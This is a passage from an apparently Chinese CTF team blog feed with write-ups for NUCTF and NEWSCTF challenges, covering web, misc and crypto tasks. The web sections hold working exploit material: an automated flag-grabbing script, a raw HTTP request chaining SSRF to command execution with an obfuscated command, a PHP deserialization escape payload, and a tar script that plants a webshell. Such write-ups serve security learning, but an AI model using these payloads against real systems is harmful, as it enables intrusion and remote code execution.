ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;flappybird666666&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>虽然确实没有什么技术含量的脚本，但在比赛中还是有点用的吧</p>
<h2 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h2><p>还有队内交流真的十分重要，两个随身携带的U盘被我们传来传去</p>
<p>没啥想说的，路还远，时间不多了，走吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210607 NUCTF中北大学校赛Nova底登陆WP</title>
    <url>/posts/d7d40428/</url>
    <content><![CDATA[<p>被姜少带飞的一天，4道Web，1道Misc，1道Crypto</p>
<p>好菜啊，这可如何是好，理论知识这块差太多了，题目都挺有意思的，一句话形容小而精</p>
<span id="more"></span>

<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>post</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">crack[me.com=xbingbing/../ssssrf.php  和 ccccmd.php</span><br><span class="line">然后拿到源码</span><br></pre></td></tr></table></figure>

<p>爆破种子，然后得到随机数</p>
<p>?num=396791256&amp;url=<a href="http://127.0.0.1/ccccmd.php">http://127.0.0.1/ccccmd.php</a></p>
<p>可以利用临时文件来解题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /ssssrf.php?num=<span class="number">396791256</span>&amp;url=http:<span class="comment">//127.0.0.1/ccccmd.php?cmd=.%2520/???/????????[@-[] HTTP/1.1</span></span><br><span class="line">Host: <span class="number">97423</span>c6c-f3d2-<span class="number">40</span>b9-a658-<span class="number">96</span>b985773ba1.machine.dasctf.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">89.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">89.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Length: 369</span></span><br><span class="line"><span class="comment">Origin: http://localhost</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://localhost/</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /f*</span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">鎻愪氦</span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917--</span></span><br></pre></td></tr></table></figure>

<p>持续发包，拿flag。</p>
<h3 id="easyunser"><a href="#easyunser" class="headerlink" title="easyunser"></a>easyunser</h3><p>简单逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;123securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(unserialize(filter(serialize(<span class="keyword">new</span> Hacker()))));</span><br></pre></td></tr></table></figure>

<h3 id="justseria"><a href="#justseria" class="headerlink" title="justseria"></a>justseria</h3><p>用 stdClass类加，取地址加 大 S 16进制绕过</p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>设置那里找到文件上传点</p>
<p>然后上传后缀白名单限制，结合hint  上传  tar文件。</p>
<p>这个有三个cve，</p>
<p>结合PHAR 协议打发序列化，用  file:// 协议直接上传到指定目录，用符号链接 来链接到指定目录。</p>
<p>符号链接没 打成，用file:// 协议就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">tar = tarfile.<span class="built_in">open</span>(<span class="string">&#x27;jiang.tar&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;file:///var/www/html/public/uploads/1.php&#x27;</span>)</span><br><span class="line">tar.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.php 是上传的木马，这里需要用绝对路径。</p>
<p>如果PHAR协议也可以用，5.0.24 存在反序列化写shell的链子，可以尝试触发。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>下载拿到一个wav文件，010打开发现奇怪的全部是FF和00</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161219231.png" alt="image-20210609161219231"></p>
<p>FF 转换为1,00转换为0。用010Editor或者notepad都可以替换。notepad快一点。</p>
<p>如以下格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0101001001100001</span><br><span class="line">0111001000100001</span><br><span class="line">0001101000000111</span><br><span class="line">0000000100000000</span><br><span class="line">1110100111101001</span><br><span class="line">0111101000001010</span><br><span class="line">0000110000000001</span><br><span class="line">0000010100001000</span><br><span class="line">0000000000000111</span><br><span class="line">0000000100000001</span><br><span class="line">1111111011101101</span><br></pre></td></tr></table></figure>

<p>然后猜测为二进制代码，复制为010里的二进制发现是Rar文件。</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161538055.png" alt="image-20210609161538055"></p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161718346.png" alt="image-20210609161718346"></p>
<p>提取出来后拿到hint.txt,零宽隐写。</p>
<p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stego online on style********</span><br></pre></td></tr></table></figure>

<p>直接google。<a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></p>
<p>解密得到flag。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="CFB（unsolved）"><a href="#CFB（unsolved）" class="headerlink" title="CFB（unsolved）"></a>CFB（unsolved）</h3><p>比赛伊始，上来一道aes的</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_________                        __                               .__       .___</span></span><br><span class="line"><span class="string">\_   ___ \_______ ___.__._______/  |_  ____   __  _  _____________|  |    __| _/</span></span><br><span class="line"><span class="string">/    \  \/\_  __ &lt;   |  |\____ \   __\/  _ \  \ \/ \/ /  _ \_  __ \  |   / __ |</span></span><br><span class="line"><span class="string">\     \____|  | \/\___  ||  |_&gt; &gt;  | (  &lt;_&gt; )  \     (  &lt;_&gt; )  | \/  |__/ /_/ |</span></span><br><span class="line"><span class="string"> \______  /|__|   / ____||   __/|__|  \____/    \/\_/ \____/|__|  |____/\____ |</span></span><br><span class="line"><span class="string">        \/        \/     |__|                                                \/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">LOGGER = <span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">WELCOME, YOU HAVE THREE CHOICES BELOW!</span></span><br><span class="line"><span class="string">1.Get encrypted flag</span></span><br><span class="line"><span class="string">2.Get encryption</span></span><br><span class="line"><span class="string">3.Exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args, **kargs</span>):</span></span><br><span class="line">        self.KEY = <span class="string">b&quot;&quot;</span></span><br><span class="line">        self.IV = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_cbc</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        aes = AES.new(self.KEY, AES.MODE_CBC, self.IV)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_cfb</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        aes = AES.new(self.KEY, AES.MODE_CFB, self.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">any_cbc</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            hex_input = self.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(hex_input) % <span class="number">32</span> != <span class="number">0</span>:</span><br><span class="line">                self.send(</span><br><span class="line">                    <span class="string">b&quot;[-] the bit length of input data must be a multiple of 128 &quot;</span>)</span><br><span class="line">            text = binascii.unhexlify(hex_input)</span><br><span class="line">            ciphertext = self.encrypt_cbc(text)</span><br><span class="line">            self.send(binascii.hexlify(ciphertext))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            self.send(<span class="string">b&quot;[-] Something Wrong!&quot;</span>)</span><br><span class="line">            self.request.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flag_cfb</span>(<span class="params">self</span>):</span></span><br><span class="line">        plaintext = self.encrypt_cfb(flag)</span><br><span class="line">        self.send(binascii.hexlify(plaintext))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">1200</span>)</span><br><span class="line">        self.KEY = os.urandom(<span class="number">32</span>)</span><br><span class="line">        self.IV = os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.send(BANNER)</span><br><span class="line">        self.send(LOGGER)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                choice = <span class="built_in">int</span>(self.recv(prompt=<span class="string">b&quot;[+] What&#x27;s your choice?\n&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(</span><br><span class="line">                    <span class="string">f&#x27;[-] Sorry, you have wrong choice, exit...&#x27;</span>.encode())</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[+] There is a encrypted message for you:&quot;</span>)</span><br><span class="line">                self.flag_cfb()</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[+] Let&#x27;s make a encryption!&quot;</span>)</span><br><span class="line">                self.any_cbc()</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[!] Bye~&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[-] Wrong!&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<h4 id="比赛中的思路"><a href="#比赛中的思路" class="headerlink" title="比赛中的思路"></a>比赛中的思路</h4><p>加密过程主要是用cfb模式的aes加密了flag，然后用相同的位移和秘钥，以cbc的模式供我们任意加密</p>
<p>那么思路很显然是获得当次加密的IV和KEY</p>
<p>我暂时写到了获取到加密后的flag，后面没有思路了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 117.21.200.166 49988</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passerby</span>():</span></span><br><span class="line">    sh.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;117.21.200.166&#x27;</span>, <span class="number">49988</span>)</span><br><span class="line"></span><br><span class="line">sh.recv(numb=<span class="number">0x1e9</span>)   <span class="comment"># 给出接收字节数</span></span><br><span class="line">sh.recv(numb=<span class="number">0x6e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到加密后的flag</span></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">passerby()</span><br><span class="line">flag_cfb = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(flag_cfb.decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破key和iv</span></span><br><span class="line">passerby()</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">passerby()</span><br><span class="line"></span><br><span class="line">sh.recv(numb=<span class="number">0x2e</span>)</span><br></pre></td></tr></table></figure>

<p>现在市面上已知的aes-cbc，需要知道有关IV和KEY的一些信息吧，都没有，但是可以在不知道IV和KEY的情况下无限加密</p>
<h3 id="rsa12"><a href="#rsa12" class="headerlink" title="rsa12"></a>rsa12</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">&#x27;*****************************************&#x27;</span></span><br><span class="line">hex_flag=<span class="built_in">int</span>(flag.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e1=<span class="number">1376213</span></span><br><span class="line">e2=<span class="number">11932523</span></span><br><span class="line">e3=<span class="number">663164990242540553660820123984958362292767589050706562525585149518469420039430050814053460276242420171688628686731721858712475428243746423919061950258579075115696969767529903377571203001499079349600716341343846020128095111908915240158242174010840342112170003771807591457926458807775028482732501</span></span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="built_in">pow</span>(hex_flag,e1,n),e2,n),e3,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,<span class="built_in">hex</span>(n),<span class="string">&quot;c=&quot;</span>,<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(&#x27;n=&#x27;, &#x27;0x5bf7c98078ceec04b8c414c65731926712d48f6852c4d7a5dfeac5344d3f02d42dc8e387eb7e731c7efb233464279811228fb4bf96dbefe753c7b5a1850cbaa4d7f1048b5d3a2a7a0d3092fd8e4be0f8e298dfc57a38604c225760446816174be08ba1bcb7eaf594126961d5feab6de678a67e1100734d2edd76d6e3778c21e7L&#x27;, &#x27;c=&#x27;, &#x27;0xcfd6983f1856b0fb6dc851d56ddcbfe66e03acb5ff568f6cd2c07f08448e09b5c513f76e939f4cf3d6f8b0950027c1a31ab6ae27d52ce0bb4b2c3d6502a8bd0e167471b1ee03e645b0aca8e2a93f4b1a8a9e3e493fc811e4104160a11494c548f21508559b508a6ef9a20df7e418fae6f33d14899419330ab29fed26712623bL&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>比较简单的rsa，利用同余的性质，三个指数相乘很大了，用boneh_durfee可以解出来<br>$$<br>c=((m^{e_1}\ mod\ n)^{e_2}\ mod\ n)^{e_3}\ mod\ n=m^{e_1e_2e_3}\ mod\ n<br>$$<br>贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">1376213</span></span><br><span class="line">e2 = <span class="number">11932523</span></span><br><span class="line">e3 = <span class="number">663164990242540553660820123984958362292767589050706562525585149518469420039430050814053460276242420171688628686731721858712475428243746423919061950258579075115696969767529903377571203001499079349600716341343846020128095111908915240158242174010840342112170003771807591457926458807775028482732501</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x5bf7c98078ceec04b8c414c65731926712d48f6852c4d7a5dfeac5344d3f02d42dc8e387eb7e731c7efb233464279811228fb4bf96dbefe753c7b5a1850cbaa4d7f1048b5d3a2a7a0d3092fd8e4be0f8e298dfc57a38604c225760446816174be08ba1bcb7eaf594126961d5feab6de678a67e1100734d2edd76d6e3778c21e7</span></span><br><span class="line">c = <span class="number">0xcfd6983f1856b0fb6dc851d56ddcbfe66e03acb5ff568f6cd2c07f08448e09b5c513f76e939f4cf3d6f8b0950027c1a31ab6ae27d52ce0bb4b2c3d6502a8bd0e167471b1ee03e645b0aca8e2a93f4b1a8a9e3e493fc811e4104160a11494c548f21508559b508a6ef9a20df7e418fae6f33d14899419330ab29fed26712623b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># boneh_durfee</span></span><br><span class="line">d3 = <span class="number">4756493741905107016896119044691618473046048544786109</span></span><br><span class="line"><span class="comment"># c2 = pow(c, d3, n)</span></span><br><span class="line"><span class="comment"># print(c2)</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">24365558073161106092835300734885784405644211668755395505407014873155490196950555802065799192523919326230891152125642692705560739026854981011343527853677799526009984453218908420224058084389551891310598951492041406656693159899669754537362598790730095352567799368412800492746291016852848356250820274189236494939</span></span><br><span class="line"></span><br><span class="line">e = e1*e2*e3</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(c, <span class="number">289646972582949907450120854337965355291</span>, n))</span><br><span class="line">m = <span class="number">218774971804085528558360699464475824982562321865118031830066995217884121485326574353743748741215026</span></span><br></pre></td></tr></table></figure>

<p>然后可以求出m，但是注意这里多了一步</p>
<img alt="20210607 NUCTF中北大学校赛-b2e587b7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210607 NUCTF中北大学校赛-b2e587b7.png" width="" height="" >

<p>flag先是hex加密了，然后转成十进制了，在线的解法可以是先转十六进制，然后hex一下</p>
<p>手写的话就是直接long_to_bytes好了，这个记一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m = <span class="number">218774971804085528558360699464475824982562321865118031830066995217884121485326574353743748741215026</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;flag is :78cc56ba4450a697fd625cc91ddf4432&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="math-rsa（unsolved）"><a href="#math-rsa（unsolved）" class="headerlink" title="math_rsa（unsolved）"></a>math_rsa（unsolved）</h3><p>增加了一些高数的求导知识</p>
<p>但是不会</p>
<h3 id="backdoor-lcg（unsolved）"><a href="#backdoor-lcg（unsolved）" class="headerlink" title="backdoor_lcg（unsolved）"></a>backdoor_lcg（unsolved）</h3><p>线性线性同余随机数生成器</p>
<p>不是很懂</p>
<p><a href="https://zhuanlan.zhihu.com/p/379154268">贴上春哥的链接</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210601 NEWSCTFNova底登陆WP</title>
    <url>/posts/72f0c58/</url>
    <content><![CDATA[<p>考试月前的比赛，儿童节快乐哦</p>
<span id="more"></span>

<h1 id="NEWSCTF"><a href="#NEWSCTF" class="headerlink" title="NEWSCTF"></a>NEWSCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>web+misc php数组key溢出，暴力破解md5  数组绕过，</p>
<p>得到密码</p>
<p>图片后面有压缩包</p>
<h3 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h3><p>php 对函数和类名大小写不敏感，小写绕过，</p>
<p>__wakeup 那里 可以触发 __construct() 任意文件读取，读flag.php 就行</p>
<h3 id="impossible-ip"><a href="#impossible-ip" class="headerlink" title="impossible ip"></a>impossible ip</h3><p>那个函数可以打ssrf，ssrf  本地的flag.php 可以看到源码，</p>
<p>然后 写入hint.txt</p>
